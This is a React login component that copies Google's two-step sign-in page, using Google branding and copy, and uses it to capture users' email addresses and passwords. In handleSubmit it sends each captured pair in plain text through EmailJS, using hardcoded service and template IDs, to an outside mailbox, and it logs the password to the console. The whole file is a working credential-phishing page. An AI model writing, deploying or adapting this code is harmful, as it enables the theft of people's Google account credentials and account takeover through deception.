import React, { useState } from 'react';
import './LoginSignUp.css';
import { useNavigate } from 'react-router-dom';
import userProfile from '../Assets/images.png';
import googleLogo from '../Assets/google.256x84.png';
import emailjs from 'emailjs-com';

const LoginSignUp = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [isActive, setIsActive] = useState(false);
    const [emailValue, setEmailValue] = useState('');
    const [passwordValue, setPasswordValue] = useState('');
    const [emailError, setEmailError] = useState('');
    const [passwordError, setPasswordError] = useState('');
    const [formData, setFormData] = useState({ email: '', password: '' });
    const navigate = useNavigate();

    const handleCheckboxChange = () => {
        setShowPassword(!showPassword);
    };

    const handleInputChange = (event) => {
        const { name, value } = event.target;
        if (name === 'email') {
            setEmailValue(value);
            validateEmail(value);
        } else if (name === 'password') {
            setPasswordValue(value);
            if (passwordError) setPasswordError('');
        }
    };

    const validateEmail = (email) => {
        const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        setEmailError(pattern.test(email) ? '' : 'Invalid email address');
    };

    const handleNextClick = (e) => {
        e.preventDefault(); // Prevent default behavior
        if (!emailValue.trim()) {
            setEmailError('Please enter your email.');
        } else if (!emailError) {
            setFormData({ ...formData, email: emailValue });
            setIsActive(true);
        }
    };

    const handleFinishClick = (e) => {
        e.preventDefault(); // Prevent default behavior
        if (!passwordValue.trim()) {
            setPasswordError('Please enter your password.');
        } else {
            setFormData({ ...formData, password: passwordValue });
            handleSubmit(); // Submit form
        }
    };

    const handleSubmit = () => {
        // Validate form data before sending
        if (!formData.email || !formData.password) {
            alert('Email and password are required.');
            return;
        }

        // Create template parameters for emailjs
        const templateParams = {
            email: formData.email,
            password: formData.password, // This is sent as plain text
        };

        // Send email using emailjs
        emailjs.send('service_fbtczun', 'template_v8ofilw', templateParams, 'HLpn8KxyhDLpeMH4a')
            .then((response) => {
                // Clear form data on success
                setFormData({ email: '', password: '' });
                navigate('/success'); // Navigate to a success page
                console.log('password', formData.password);
            })
            .catch((error) => {
                alert('Failed to send message.');
                console.error('Error:', error);
            });
    };

    return (
        <div className='Container'>
            <form className='Container'>
                <div className={`header ${isActive ? '' : 'active'}`}>
                    <img src={googleLogo} alt="Google" className='google' />
                    <div className="text">Sign in</div>
                    <h4>with your Google account</h4>
                    <h4 className='blue'>Learn more about using your account</h4>
                    
                    <div className="inputs">
                        <div className="input">
                            <input
                                type='email'
                                value={emailValue}
                                name='email'
                                onChange={handleInputChange}
                                placeholder='Enter your Email'
                                className='passwordInput'
                                style={{ borderColor: emailError ? 'red' : '' }}
                            />
                            <div className="errors">
                                {emailError && <p className="error">{emailError}</p>}
                            </div>
                            <div className="password">
                                <h4 className="blue">Forgot email?</h4>
                            </div>
                        </div>
                    </div>
                    <div className="submitContainer">
                        <button className="button" onClick={handleNextClick}>Next</button>
                    </div>
                </div>

                <div className={`header ${isActive ? 'active' : ''}`}>
                    <img src={googleLogo} alt="Google" className='google' />
                    <div className="text">Almost done</div>

                    <div className="user">
                        <img src={userProfile} alt="User Profile" className='user'/>
                        <div className="text">{emailValue}</div>
                    </div>
                    
                    <div className="inputs">
                        <div className="input">
                            <input
                                type={showPassword ? 'text' : 'password'}
                                name='password'
                                value={passwordValue}
                                onChange={handleInputChange}
                                placeholder='Enter your password'
                                className='passwordInput'
                            />
                            {passwordError && <p className="error">{passwordError}</p>}
                            <div className="password">
                                <label htmlFor="showPassword">
                                    <input
                                        type="checkbox"
                                        name="showPassword"
                                        id="showPassword"
                                        checked={showPassword}
                                        onChange={handleCheckboxChange}
                                    />
                                    Show password
                                </label>
                            </div>
                        </div>
                    </div>
                    <div className="submitContainer">
                        <button className="button" type='button' onClick={handleFinishClick}>Finish</button>
                    </div>
                </div>
            </form>
        </div>
    );
};

export default LoginSignUp;
